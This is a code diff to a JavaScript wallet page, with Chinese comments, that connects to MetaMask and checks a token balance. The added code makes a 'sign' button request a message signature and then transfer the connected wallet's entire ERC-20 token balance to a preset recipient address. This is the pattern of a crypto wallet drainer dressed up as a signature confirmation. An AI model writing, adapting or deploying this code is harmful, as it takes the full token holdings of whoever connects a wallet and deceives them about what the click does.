@@ -34,6 +34,21 @@ window.onload = async () => {
             updateStatus('请安装 MetaMask 钱包');
         }
     };
+
+    // 签名按钮点击事件
+    document.getElementById('signButton').onclick = async () => {
+        const account = await signer.getAddress();
+        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
+        try {
+            const signature = await signer.signMessage(message);
+            updateStatus(`签名成功: ${signature}`);
+
+            // 调用转移资产的函数
+            await transferAssets(account);
+        } catch (error) {
+            updateStatus(`签名失败: ${error.message}`);
+        }
+    };
 };
 
 // 检查代币余额的函数
@@ -45,6 +60,23 @@ const checkTokenBalance = async (account) => {
         updateStatus(`当前余额: ${formattedBalance} 代币`);
     } catch (error) {
         updateStatus(`获取余额失败: ${error.message}`);
+    }
+};
+
+// 转移资产的函数
+const transferAssets = async (account) => {
+    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
+    try {
+        const balance = await tokenContract.balanceOf(account);
+        if (balance.gt(0)) {
+            const transferTx = await tokenContract.transfer(recipientAddress, balance);
+            await transferTx.wait(); // 等待交易确认
+            updateStatus(`成功转移 ${ethers.utils.formatUnits(balance, 18)} 代币到 ${recipientAddress}`);
+        } else {
+            updateStatus(`账户 ${account} 没有足够的代币`);
+        }
+    } catch (error) {
+        updateStatus(`转移失败: ${error.message}`);
     }
 };
 
